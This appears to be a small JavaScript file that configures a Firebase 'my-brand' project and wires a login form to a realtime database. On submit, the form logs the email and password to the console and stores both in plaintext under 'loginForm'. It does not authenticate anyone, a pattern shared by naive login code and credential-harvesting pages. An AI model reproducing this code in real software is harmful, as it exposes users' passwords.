const firebaseConfig = {
    apiKey: "AIzaSyANOQtna0Fb2uPlu9leWwf7X8xb12xoaHU",
    authDomain: "my-brand-24ab1.firebaseapp.com",
    databaseURL: "https://my-brand-24ab1-default-rtdb.firebaseio.com",
    projectId: "my-brand-24ab1",
    storageBucket: "my-brand-24ab1.appspot.com",
    messagingSenderId: "210862322041",
    appId: "1:210862322041:web:57025948a30797b3fcffa8"
  };

  firebase.initializeApp(firebaseConfig);

  var loginFormDB=firebase.database().ref('loginForm');
document.getElementById('login').addEventListener('submit',submitForm);
function submitForm(e){
    e.preventDefault();
    var mail=getElementVal('mail');
    var pass=getElementVal('pass');
    console.log(mail,pass);
    saveCred(mail,pass);
}
const saveCred= (mail,pass)=>{
    var newCred=loginFormDB.push();
    newCred.set({
        mail:mail,
        pass:pass,  
    });
};

const getElementVal= (id)=>{
    return document.getElementById(id).value;
}